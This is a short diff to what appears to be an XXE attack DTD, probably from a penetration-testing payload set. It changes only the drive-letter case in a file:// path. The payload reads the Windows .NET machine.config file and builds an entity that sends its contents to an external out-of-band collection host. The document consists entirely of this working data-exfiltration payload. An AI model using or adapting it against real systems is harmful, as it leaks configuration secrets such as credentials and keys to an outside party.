@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///c:\Windows\Microsoft.NET\Framework\v4.0.30319\CONFIG\machine.config">
+<!ENTITY % data SYSTEM "file:///C:\Windows\Microsoft.NET\Framework\v4.0.30319\CONFIG\machine.config">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
